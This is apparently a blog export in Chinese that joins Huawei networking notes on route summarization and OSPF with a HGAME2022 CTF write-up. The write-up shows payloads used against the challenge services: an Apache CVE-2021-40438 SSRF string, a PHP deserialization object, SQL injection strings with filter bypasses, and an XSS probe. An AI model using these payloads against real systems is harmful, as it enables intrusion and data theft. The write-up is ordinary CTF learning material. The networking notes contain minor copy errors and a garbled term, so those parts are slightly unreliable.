对于一个大规模的网络来说，路由器或其他具备路由功能的设备势必需要维护大量的路由表项，为了维护臃肿的路由表，这些设备就不得不耗费大量的资源。同时，由于路由表的规模变大，会导致路由器在查表转发时效率降低。因此在保证网络中的路由器到各网段都具备IP可达性的同时，需要减小设备的路由表规模。一个网络如果具备科学的IP编址，并且进行合理的规划，是可以利用多种手段减小设备路由表规模的。一个非常常见而又有效的办法就是使用路由汇总（Route Summarization）。路由汇总又被称为路由聚合（Route Aggregation），是将一组有规律的路由汇聚成一条路由，从而达到减小路由表规模以及优 化设备资源利用率的目的，我们把汇聚之前的这组路由称为精细路由或明细路由，把汇聚 之后的这条路由称为汇总路由或聚合路由 简介 RTA上为了能够前往远端地址，需要为每一个远端网段配置一条明细路由。去往10.1.1.0/24、10.1.2.0/24、10.1.3.0/24…拥有相同下一跳。将拥有相同下一跳，一组有规律的路由汇总成 一条路由，这叫做路由汇总。 计算将明细路由的目的网络都换算成二进制，然后排列起来，找出所有目的网络地址中&quot;相同的比特位&quot; 汇总引发的问题路由汇总会造成环路问题 解决方法： 在RTB上增加一条指向NULL0的路由 一般来说一条路由，无论是静态的或者是动态的，都需要关联到一个出接口，路由的出接口指的是设备要到达一个目的网络时的出站接口。路由的出接口可以是该设备的物理接口， 例如百兆、千兆以太网接口，也可以是逻辑接口，例如VLAN接口（VLAN Interface），或者隧道（Tunnel）接口等。在众多类型的出接口中，有一种接口非常特殊，那就是Null （无效）接口，这种类型的接口只有一个编号，也就是0。Null0是一个系统保留的逻辑接 口，当网络设备在转发某些数据包时，如果使用出接口为Null0的路由，那么这些报文将被 直接丢弃，就像被扔进了一个黑洞里，因此出接口为Null0的路由又被称为黑洞路由 精确汇总当配置的静态汇总路由范围太广时可能会将流量发送到其他的网段导致数据包丢失，这种路由为不精确路由。为此配置汇总路由时要尽量精确，刚好包括所有的明细路由 思考路由器如何优选路由条目？ 首先根据preference选择，如果preference相同则继续比较度量值，如果度量值也相同， 则都会被加入路由表形成等价路由。 如何配置实现浮动路由？ 首先根据preference选择，如果preference相同则继续比较度量值，如果度量值也相同， 则都会被加入路由表形成等价路由。 将10.1.1.0/24、10.1.3.0/24、10.1.9.0/24汇总之后的网段是？ 10.1.0.0/20 OSPF基础静态路由由网络管理员手工配置，因此当网络变化时，静态路由需要手工调整，制约了静态路由在现网的大规模应用。因此动态路由因其灵活性高、可靠性好，易于扩展等特点被广泛应用于现网。 而在动态路由协议中，OSPF(开放式最短路径优先)协议是使用场景非常广泛的动态路由协议之一，是一种基于链路状态算法的路由协议 OSPF协议概述为什么需要动态路由静态路由由网络管理员手动配置和维护，适用于小型或稳定的网络 但无法适应规模较大的网络，无法动态响应网络变化。 随着设备数量增加，配置量急剧增加，静态路由已无法适应 动态路由协议的分类 BGP使用一种基于距离矢量算法修改后的算法，该算法被称为路径矢量（Path Vector）算法。因此在某些场合下，BGP也被称为路径矢量路由协议。 距离矢量路由协议 运行矢量路由协议的路由器周期性的泛洪自己的路由表。通过路由交互，每台路由器都从相邻的路由器学习到路由，并且加载进自己的路由表中 对于网络中的所有路由器而言，路由器并不清楚网络的拓扑，只是简单的知道要去往某个目的方向在哪里，距离有多远。这就是距离矢量算法的本质。 链路状态路由协议链路状态路由协议-LSA泛洪与距离矢量协议不同，链路状态由协议通告的是链路状态而不是路由表。运行链路状态路由协议的路由器之间首先会建立一个协议的邻居关系，然后彼此之间开始交互LSA（Link State Advertisement，链路状态通告） 不再通告路由信息，而是LSA 链路状态通告，可以简单的理解为每台路由器都产生一个描述自己直连接口状态（包括接口的开销、与邻居路由器之间的关系等）的通告 链路状态路由协议-LSDB泛洪每台路由器都会产生LSAs，路由器将接收到的LSAs放入自己的LSDB（Link State DataBase，链路状态数据库）。LSDB汇总了网络中路由器对于自己接口的描述，包含全网拓扑的描述。路由器通过LSDB，掌握了全网的拓扑 链路状态路由协议-SPF计算每台路由器基于LSDB，使用SPF（Shortest Path First，最短路径优先）算法进行计算，每台路由器都计算出一颗以自己为根的、无环的、拥有最短路径的“树”。有了这颗“树”，路由器就以及知道了到达网络各个角落的优选路径 SPF是OSPF路由协议的一个核心算法，用来在一个复杂的网络中做出路由优选的决策。 链路状态路由协议-路由表生成路由器将根据SPF计算出来的优选路径，加载进自己的路由表 链路状态路由协议总结 第一步是建立相邻路由器之间的邻居关系。 第二步是邻居之间交互链路状态信息和同步LSDB。 第三步是进行优选路径计算。 第四步是根据最短路径树生成路由表项加载到路由表 OSPF简介 OSPF基础术语区域OSPF Area用于标识一个OSPF的区域 区域是从逻辑上将设备划分为不同的组，每个组用区域号(Area ID)来标识 Router-IDRouter-ID（Router Identifier，路由器标识符），用于在一个OSPF域中唯一地标识一台路由器。 Router-ID的设定可以通过手工配置的方式，或使用系统自动配置的方式。 在实际项目中，通常会通过手工配置方式为设备指定OSPF Router-ID。请注意必须保证在OSPF域中任意两台设备的Router-ID都不相同。通常的做法是将Router-ID配置为与该设备某个接口（通常为Loopback接口）的IP地址一致 度量值OSPF使用Colongtst（开销）作为路由的度量值。每一个激活了OSPF的接口都会维护一个接口的Cost值，缺省时接口Cost值=100 Mbit/s/接口带宽。其中100 Mbit/s为OSPF指定的缺省参考值，该值是可以配置的。 笼统地说，一条OSPF路由的Cost值可以理解为是从目的网段到本路由器沿途所有入接口的Cost值累加。 OSPF协议报文类型OSPF有五种类型的协议报文，这些报文在OSPF路由器之间交互中起不同的作用 OSPF三大表项OSPF有三张重要的表项，OSPF邻居表、LSDB表和OSPF路由表 OSPF邻居表OSPF在传递链路状态信息之前，需先建立OSPF邻居关系 OSPF的邻居关系通过交互Hello报文建立 OSPF邻居表显示了OSPF路由器之间的邻居状态，使用display ospf peer查看 LSDB表LSDB会保存自己产生的及从邻居收到的LSA信息 Type标识LSA的类型，AdvRouter标识发送LSA的路由器 使用命令行display ospf lsdb查看LSDB表 OSPF路由表OSPF路由表和路由器路由表是两张不同的表项 OSPF路由表包含Destination、Cost和NextHop等指导转发的信息。 使用display ospf routing查看OSPF路由表 OSPF协议工作原理OSPF路由器之间的关系 OSPF路由器之间的关系有两个重要的概念，邻居关系和邻接关系 假设两台路由器直连，在双方互联接口上激活OSPF，路由器开始发送及侦听Hello报文，在通过Hello报文发现彼此后，这两台路由器便形成了邻居关系 邻居关系的建立只是开始，后续会进行一系列的报文交互，例如前文提到的DD、LSR、LSU和LS ACK等，当两台路由器LSDB同步完成，并开始独立计算路由时，这两台路由器形成了邻接关系 OSPF邻接关系建立过程OSPF完成邻接关系的建立有四个步骤，建立邻居关系、协商主/从、交互LSDB信息，同步LSDB。 流程1 当一台OSPF路由器收到其他路由器发来的首个Hello报文时会从初始Down状态切换为Init 状态。 当OSPF路由器收到的Hello报文中的邻居字段包含自己的Router ID时，从Init切换2-way状 态 流程2&amp;3 邻居状态机从2-way转为Exstart状态后开始主从关系选举： R1向R2发送的第一个DD报文内容为空，其Seq序列号假设为X。 R2也向R1发出第一个DD报文，其Seq序列号假设为Y。 选举主从关系的规则是比较Router ID，越大越优。R2的Router ID比R1大，因此R2成 为真正的主设备。主从关系比较结束后，R1的状态从Exstart转变为Exchange。 R1邻居状态变为Exchange后，R1发送一个新的DD报文，包含自己LSDB的描述信息，其序 列号采用主设备R2的序列号。R2收到后邻居状态从Exstart转变为Exchange。 R2向R1发送一个新的DD报文，包含自己LSDB的描述信息，序列号为Y+1。 R1作为从路由器需要对主路由R2发送的每个DD报文进行确认，回复报文的序列号与主路由 R2一致。 发送完最后一个DD报文后，R1将邻居状态切换为Loading。 流程4 邻居状态转变为Loading后，R1向R2发送LSR报文，请求那些在Exchange状态下通过DD报 文发现的，但是在本地LSDB中没有的LSA。 R2收到后向R1回复LSU。在LSU报文中包含被请求的LSA的详细信息。 R1收到LSU报文后，向R2回复LS ACK报文，确认已接收到，确保信息传输的可靠性。 此过程中R2也会向R1发送LSA请求。当两端LSDB完全一致时，邻居状态变为Full，表示成 功建立邻接关系。 OSPF网络类型简介OSPF网络类型是一个非常重要的接口变量，这个变量将影响OSPF在接口上的操作，例如采用什么方式发送OSPF协议报文，以及是否需要选举DR、BDR等。 接口默认的OSPF网络类型取决于接口所使用的数据链路层封装 OSPF有四种网络类型 Broadcast、NBMA、P2MP和P2P OSPF网络类型（1）一般情况下，链路两端的OSPF接口网络类型必须一致，否则双方无法建立邻居关系 OSPF网络类型可以在接口下通过命令手动修改以适应不同网络场景 OSPF网络类型（2） DR与BDR背景： MA（Multi-Access）多路访问网络有两种类型：广播型多路访问网络（BMA）及非广播类多路访问网络（NBMA）。以太网（Ethernet）是一种典型的广播型多路访问网络 在MA网络中，如果每台OSPF路由器都与其他的路由器建立OSPF邻接关系，便会导致网络中存在过多的OSPF邻接关系，增加设备负担，也增加了网络中泛洪的OSPF报文数量 当拓扑出现变更，网络中的LSA泛洪可能会造成带宽的浪费和设备资源的损耗 为优化MA网络中OSPF邻接关系，OSPF指定了三种OSPF路由器身份，DR（Designated Router，指定路由器）、BDR（Backup Designated Router，备用指定路由器）和DRother路由器。 只允许DR、BDR与其他OSPF路由器建立邻接关系。DRother之间不会建立全毗邻的OSPF邻接关系，双方停滞在2-way状态 BDR会监控DR的状态，并在当前DR发生故障时接替其角色 选举规则：OSPF DR优先级更高的接口成为该MA的DR，如果优先级相等（默认为1），则 具有更高的OSPF Router-ID的路由器（的接口）被选举成DR，并且DR具有非抢占性。 OSPF域与单区域OSPF域（Domain）：一系列使用相同策略的连续OSPF网络设备所构成的网络。 OSPF路由器在同一个区域内网络中泛洪LSA。为了确保每台路由器都拥有对网络拓扑的一致认知，LSDB需要在区域内进行同步。 如果OSPF域仅有一个区域，随着网络规模越来越大，OSPF路由器的数量越来越多，这将会导致诸多问题： LSDB越来越庞大，同时导致OSPF路由表规模增加，路由器资源消耗多，设备性能下降，影响数据转发 基于庞大的LSDB进行路由计算变得困难 当网络拓扑变更时，LSA全域泛洪和全网SPF重计算带来巨大负担 OSPF多区域OSPF引入区域的概念，将一个OSPF域划分成多个区域，可以使OSPF支撑更大规模组网。 OSPF多区域的设计减小了LSA泛洪的范围，有效的把拓扑变化的影响控制在区域内，达到网络优化的目的。 在区域边界可以做路由汇总，减小了路由表规模。 多区域提高了网络扩展性，有利于组建大规模的网络。 区域的分类：区域可以分为骨干区域与非骨干区域。骨干区域即Area0，除Area0以外其他 区域都称为非骨干区域。 多区域互联原则：基于防止区域间环路的考虑，非骨干区域与非骨干区域不能直接相连， 所有非骨干区域必须与骨干区域相连 OSPF路由器类型OSPF路由器根据其位置或功能不同，分为 区域内路由器（Internal Router）：该类路由器的所有接口都属于同一个OSPF区域。 区域边界路由器ABR（Area Border Router）：该类路由器的接口同时属于两个以上的区域， 但至少有一个接口属于骨干区域。 骨干路由器（Backbone Router）：该类路由器至少有一个接口属于骨干区域。 自治系统边界路由器ASBR（AS Boundary Router）：该类路由器与其他AS交换路由信息。 只要一台OSPF路由器引入了外部路由的信息，它就成为ASBR。 OSPF单区域&amp;多区域典型组网中小型企业网络规模不大，路由设备数量有限，可以考虑将所有设备都放在同一个OSPF区 域。 大型企业网络规模大，路由设备数量很多，网络层次分明，建议采用OSPF多区域的方式部 署。","categories":[],"tags":[{"name":"华为ict","slug":"华为ict","permalink":"https://ethe448.github.io/tags/%E5%8D%8E%E4%B8%BAict/"}]},{"title":"HGAME2022 wp","slug":"HGAME2022-wp","date":"2022-01-21T09:09:12.000Z","updated":"2022-03-28T08:22:18.446Z","comments":true,"path":"2022/01/21/HGAME2022-wp/","link":"","permalink":"https://ethe448.github.io/2022/01/21/HGAME2022-wp/","excerpt":"","text":"带*为赛后复现 第一周wpMISC欢迎欢迎！热烈欢迎！签到 这个压缩包有点麻烦压缩包，先真加密，爆破得到密码，然后字典爆破，再明文爆破，最后得到的一个藏着伪加密压缩包的图片，破掉伪加密把压缩包解压能得到flag 好康的流量wireshark打开，追踪tcp流得到一大串base64值，转成图片 stegslove看一下 找个在线扫条形码的网站扫一下得到前半部分，后半部分利用zsteg能直接看到 群青(其实是幽灵东京）第一个音频文件 猜密码是yoasobi 得到一个网址，里面是sstv为文件名的音频文件，用robot36接收一下 得到一个二维码 扫码拿到flag WEBeasy_auth 题目描述暗示todo里藏着东西，看一下源码 猜到flag可能再id为1的内容里 访问的时候显示没添加cookie或者token 抓包给他加个jwt jwt可以根据前边的网页抓包得到的jwt修改 蛛蛛...嘿嘿♥我的蛛蛛 from time import sleep import requests url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot; key &#x3D; &quot;?key&#x3D;VmqCK2lB2LRY2sM%2F5rEjFXHRemjYkb%2BQ2YHG8z7oy1krIf6R%2FOVrA8Ho5G9rxahnu6%2BTfwj6ZRbt3YP405Y12Q%3D%3D&quot; for i in range(1, 1000): url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot; url &#x3D; url + key print(url) r &#x3D; requests.get(url&#x3D;url) # if &#39;href&#39; in r.text: print(r.text) lstNew &#x3D; r.text if &#39;href&#39; in lstNew: start &#x3D; lstNew.find(&quot;href&#x3D;\\&quot;?&quot;) print(start) end &#x3D; lstNew.find(&quot;D\\&quot;&gt;点我试试&quot;) print(end) length &#x3D; len(&quot;href&#x3D;\\&quot;&quot;) l &#x3D; lstNew[start + length:end +1] key &#x3D; l print(key) if key &#x3D;&#x3D; &#39;&#39;: break sleep(0.5) if &quot;hgame&#123;&quot; in r.text: print(r.text) break else: print(r.text) break 写的脚本（好拉的编程 跑到第100关后在响应头里找 Tetris plus源码里直接找 Fujiwara Tofu Shop 先加个referer头为qiumingshan.net 然后改ua 再改cookie flavor = Raspberry 然后再加上一个Gasoline:100 再是要求本地登录，但是过滤了xff，换个头就行 IOT饭卡的uno不会iot，但是这个把附件拖了ida里就能看见flag CRYPTOEasy RSA已知p，q，e和密文求明文的rsa import libnum from Crypto.Util.number import long_to_bytes string &#x3D; &#39;&#39; flag &#x3D; [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)] for x in range(38): c &#x3D; flag[x][3] q &#x3D; flag[x][2] p &#x3D; flag[x][1] n &#x3D; p*q e &#x3D; flag[x][0] d &#x3D; libnum.invmod(e, (p - 1) * (q - 1)) m &#x3D; pow(c, d, n) string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;) print(string) English Novel给了四个文件，一个小说原文，一个加密后的小说，一个加密脚本，一个flag密文 先根据小说原文里的标点通过Linux的grep命令看一下相对的密文 再根据加密脚本逆向写出求key的脚本，然后是求密文（真的好拉的编程 def encrypt(data, key): # assert len(data) &lt;&#x3D; len(key) result &#x3D; &quot;&quot; for i in range(len(data)): if data[i].isupper(): result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) elif data[i].islower(): result +&#x3D; chr((ord(data[i]) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;)) else: result +&#x3D; data[i] return result def decrypt(result, key): # assert len(data) &lt;&#x3D; len(key) data &#x3D; &quot;&quot; for i in range(len(result)): if result[i].isupper(): #result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) for k in range(65,90):#python这个对负数求余真不知道怎么逆了，只能爆破了 result1 &#x3D; chr((k - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) if result1 &#x3D;&#x3D; result[i]: data +&#x3D; chr(k) elif result[i].islower(): for k in range(96,123): result1 &#x3D; chr((ord(chr(k)) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;)) if result1 &#x3D;&#x3D; result[i]: data +&#x3D; chr(k) else: data +&#x3D; result[i] print(data) def decryptkey(data1, result1): keyboard &#x3D; [] for n in range(25): for i in range(len(data1)): if data[i].isupper(): # result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;)) key &#x3D; str((ord(result1[i]) - ord(&#39;A&#39;) + (26 * n)) + ord(&#39;A&#39;) - ord(data1[i])) keyboard.append(key) elif data[i].islower(): key &#x3D; str((ord(result1[i]) - ord(&#39;a&#39;) + (26 * n)) + ord(&#39;a&#39;) - ord(data1[i])) keyboard.append(key) else: key &#x3D; 0 keyboard.append(key) n &#x3D; str(n) for i in keyboard: print(i, end&#x3D;&#39;,&#39;) print(&#39;&#x2F;n&#39;) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: data &#x3D; &quot;&quot;&quot;urveying the ground, Snowball declared that this was just the place for a windmill&quot;&quot;&quot;#这里写原文 result &#x3D; &quot;klsyf&#123;W0_j0v_ca0z_&#39;Ks0ao-bln1qstxp_juqfqy&#39;?&#125;&quot;#这里写密文 a &#x3D; [3, 5, -8, 12, 1, -2, -7, 10, 0, -15, 1, 1, 0, 18, -13, -7, 3, 12, 20, 0, 0, -16, 4, 1, -17, 12, 0, 13, -4, 0, -1, 15, 0, -4, 25, -17, 1, -3, 0, -12, 14, 3, 3, 0, 0, 8, -8, 6, 0, 0, 21, 7, 0, -5, -20, -6, -17, 0, -6, 13, 8, 0,2, 1, 20, 20, -1, 0, 16, -10, -1, 0, 21, 0, -6, -5, 9, 18, 10, 16, 10, 5, 0, 0, 0, 6, -8, -1, 7, 0, 20, 9, 2, 3, -3] #decryptkey(data, result) decrypt(result, a) #print(encrypt(data, a)) 这个flag在单引号里边的部分还是有点问题，可能是因为key的关系，但是由attfck能猜出attack，由pla1qtext能猜出plaintext，然后改完之后搜一下 最终flag hgame{D0_y0u_kn0w_&#39;Kn0wn-pla1ntext_attack&#39;?} 第二周wpWEBApache!*有备份文件 根据题目描述应该是ssrf漏洞，结合apache版本能搜到CVE-2021-40438 ?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:&#x2F;&#x2F;internal.host&#x2F; 但是网上的 exp 大多是 Apache 直接作为代理服务器的情况，这题给了 Apache 的配置文件 https-vhosts.conf , &#39;/&#39; 提供静态资源服务， &#39;/proxy&#39; 提供代理服务。 所以要在/proxy路径下用payload webpack-engine 看源码，两次base64解码得到flag hgame&#123;D0nt_f0r9et_2_ClOs3_S0urce_m@p&#125; 一本单词书看源码有www.zip的提示 代码审计一下 简单的用户判断 绕过之后 看index.php 大致逻辑就是将输入的传入get.php和save.php进行处理 save.php 将传入的单词的key和value写入文件中，并利用|来将key和value的序列化之后的值分隔。 get.php 读取save.php中创建的文件的内容 evil.php 看见wakeup方法，再联系get.php时的unserialize可以猜测这里是要利用反序列化让file=/flag然后令flag变量的值变为flag再利用get.php将其读出来 这里要注意序列化的内容要在填在单词的位置，将其作为数组的key而不是value，否则在encode函数时会对value再进行一次序列化导致payload改变，无法执行反序列化操作 还要在反序列化的payload前添加|符号 让|后的部分执行decode函数中的反序列化 将evil类中的file赋值为/flag，从而让flag=/flag文件中的内容 这里的if过滤没啥用 最终payload &#123;|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;N;&#125; Pokemon 开始页面，源码里提示了个index?id=1 输到url上能看出来id的数决定了出现的是哪个精灵 当id不是1，2，3其中的数时会跳转到error.php 刚开始感觉是sql注入，注了半天这个页面没报错，这里id的值感觉是通过php的弱比较来判断的，开始怀疑是不是别的漏洞。 扫了一下扫到了db.php才确定就是sql注入 于是尝试在error界面注入 当code不为数字时会出现报错 刚开始没有给源码，试了好几次没试出来怎么注入 主办方给的源码： 有了源码之后就是一个很简单的联合注入了 括号或者/*x*/替代空格，用like替代等于，双写绕过关键字，因为是数字型注入，所以也不需要注释符 爆库名 ?code&#x3D;1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,database() ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere(table_schema)like&#39;pokemon&#39; ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name)like&#39;fllllllllaaaaaag&#39; ?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,(flag)frfromom&#x2F;*x*&#x2F;fllllllllaaaaaa At0m的留言板*xss漏洞 说起这个我就想起来b站那次的xss，还有我还没开始的js学习（ 先试一下 &lt;script&gt;alert(1)&lt;&#x2F;script&gt; 确定是xss 然后主办方给了个hint 输出用户留言位置的class标签名为content，然后还有一个用var定义的flag全局变量 